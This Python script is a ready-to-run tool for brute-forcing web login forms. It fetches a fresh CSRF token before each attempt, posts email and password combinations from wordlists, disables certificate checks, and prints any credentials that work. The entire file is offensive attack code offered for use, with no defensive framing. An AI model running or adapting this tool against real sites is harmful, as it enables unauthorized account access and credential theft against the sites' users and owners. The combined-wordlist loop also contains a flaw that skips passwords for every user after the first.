import requests
from bs4 import BeautifulSoup
import sys
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from timeit import default_timer as timer

def getCSRF(url, csrfname, session):
	html = session.get(url, verify=False).text
	soup = BeautifulSoup(html, features="lxml")
	try:
		csrfvalue = soup.find('input', {"name":csrfname}).get("value")
	except AttributeError:
		print("[-] Wrong csrf csrfvalue name")
		sys.exit(1)

	return csrfvalue

def send_post(user, password, url, csrfname, csrfvalue, error, verbosity, session):
	data = {
		"email": user,
		"password": password,
		csrfname: csrfvalue
	}

	post_login = session.post(url, data, allow_redirects=True, verify=False)
	if (verbosity != None):
		if post_login.history:
			print("Request was redirected")
		else:
			print("Request was not redirected")
		
		print(post_login.text)

	if error not in post_login.text:
		return True

	else:
		return False

def login(user, password, url, csrfname, error, verbosity, session):
	if (verbosity != None):
		start = timer()
		print("[+] Trying "+user+":"+password+"")
		print("[+] Retrieving CSRF csrfvalue...")
		csrfvalue = getCSRF(url, csrfname, session)

		print("[+] CSRF token: {0}".format(csrfvalue))

		found_credentials = send_post(user, password, url, csrfname, csrfvalue, error, verbosity, session)
		end = timer()
		print(end - start)	
	else:
		csrfvalue = getCSRF(url, csrfname, session)
		found_credentials = send_post(user, password, url, csrfname, csrfvalue, error, verbosity, session)

	if (found_credentials):
		print("-------------------------------------------------------------")
		print("[+] Correct credentials")
		print("-------------------------------------------------------------")
		print()
		print("[*]\t"+user+":"+password)
		print()
		print("-------------------------------------------------------------")
		sys.exit(1)
	else:
		print("[-] Wrong credentials\t"+user+":"+password)					
					

if __name__ == '__main__':

	banner = """
	
██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
                ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗                  
                ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝                  
                ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗                  
                ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║                  
                ██████╔╝   ██║   ██║     ██║  ██║███████║███████║                  
                ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝                  
                    Created by Enrique Tomás Martínez Beltrán                                     
	"""
	print(banner)
	parser = argparse.ArgumentParser()
	
	user_group = parser.add_mutually_exclusive_group(required=True)
	user_group.add_argument('-l', '--user', help='user')
	user_group.add_argument('-L', '--users', help='users worldlist')
	
	pass_group = parser.add_mutually_exclusive_group(required=True)
	pass_group.add_argument('-p', '--password', help='password')
	pass_group.add_argument('-P', '--passwords', help='passwords wordlist')

	parser.add_argument('-u', '--url', help='url with login form', required=True)
	parser.add_argument('-c', '--csrfname', help='the name of the CSRF field', required=True)
	parser.add_argument('-e', '--error', help="error message when entering incorrect credentials", required=True)

	parser.add_argument('-v', '--verbosity', action='count', help='verbosity')
	parser.add_argument('-r', '--proxy', action='count', help='using proxy')

	args = parser.parse_args()

	session = requests.session()
	if args.proxy != None:
		session.proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'https://127.0.0.1:8080'}

	if (args.users == None and args.password == None):
		with open(args.passwords, 'rb') as passfile:
			for password in passfile.readlines():
				login(args.user, password.decode().strip(), args.url, args.csrfname, args.error, args.verbosity, session)
	
	if (args.user == None and args.passwords == None):
		with open(args.users, 'rb') as userfile:
			for user in userfile.readlines():
				login(user.decode().strip(), args.password, args.url, args.csrfname, args.error, args.verbosity, session)

	if (args.user == None and args.password == None):	
		with open(args.users, 'rb') as userfile:
			with open(args.passwords, 'rb') as passfile:
				for user in userfile.readlines():
					for password in passfile.readlines():
						login(user.decode().strip(), password.decode().strip(), args.url, args.csrfname, args.error, args.verbosity, session)
